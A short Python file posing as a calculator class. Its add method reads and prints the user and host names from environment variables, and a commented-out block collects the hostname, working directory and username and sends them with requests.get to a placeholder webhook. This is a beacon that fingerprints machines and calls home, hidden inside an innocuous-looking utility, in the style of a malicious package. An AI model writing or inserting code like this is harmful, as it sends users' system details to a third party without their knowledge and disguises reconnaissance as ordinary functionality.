import os,requests,getpass,socket

class calculator:
    def add(x, y):
        user = os.getenv('USER')
        host = os.getenv('HOSTNAME')
        print(user, host)
        return x+y

    def subtract(x, y):
        return x - y

    def multiply(x, y):
        return x * y

    def divide(x, y):
        return x / y


#def calculator():
#        hostname=socket.gethostname()
#        cwd = os.getcwd()
#        #username = getpass.getuser()
#        #ploads = {'hostname':hostname,'cwd':cwd,'username':username}
#        #requests.get("<WEBHOOK>",params = ploads)
#        user = os.getenv('USER')
#        host = os.getenv('HOSTNAME')
#        print(user, host)




#calculator()
